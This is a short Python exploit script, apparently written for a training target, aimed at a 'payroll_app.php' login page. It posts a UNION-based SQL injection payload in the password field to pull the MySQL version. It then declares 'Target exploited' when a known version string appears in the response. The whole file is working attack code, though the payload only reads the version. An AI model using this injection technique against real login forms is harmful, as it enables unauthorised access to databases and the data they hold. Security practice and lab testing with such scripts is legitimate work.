#!/usr/bin/env python3

import requests
import argparse


class Payroll:
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__path = "/payroll_app.php"

    def __exploit(self):
        sql = {
            "user": "defcon",
            "password": "' UNION SELECT null,null,null,@@version#",
            "s": "OK",
        }
        check = "5.5.62-0ubuntu0.14.04.1"
        r = requests.post(f"http://{self.__host}:{self.__port}{self.__path}", data=sql)
        if check in r.text:
            return True
        return False

    def run(self):
        return self.__exploit()


def main(args):
    print("[+] Exploiting payroll_app.php by xentrick")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Payroll(args.host, int(args.port))
    if exploit.run():
        print("Target exploited")
    else:
        print("Exploit failed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", required=True)
    args = parser.parse_args()

    main(args)
